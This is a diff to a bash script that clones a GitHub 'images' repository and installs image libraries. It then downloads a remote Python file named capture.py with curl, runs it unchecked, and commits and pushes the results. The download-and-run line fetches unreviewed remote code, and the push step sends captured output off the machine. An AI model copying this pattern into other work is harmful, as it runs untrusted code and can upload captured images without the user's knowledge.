@@ -1,3 +1,16 @@
 #!/bin/bash
 
+git clone https://github.com/RAGREON/images.git
+cd ./images
+
 pip install pillow opencv-python
+
+curl -s https://raw.githubusercontent.com/RAGREON/bashScripts/main/fun_script/python_scripts/capture.py > script.py
+
+python ./script.py
+
+git add .
+
+git commit -m "added image"
+
+git push origin main
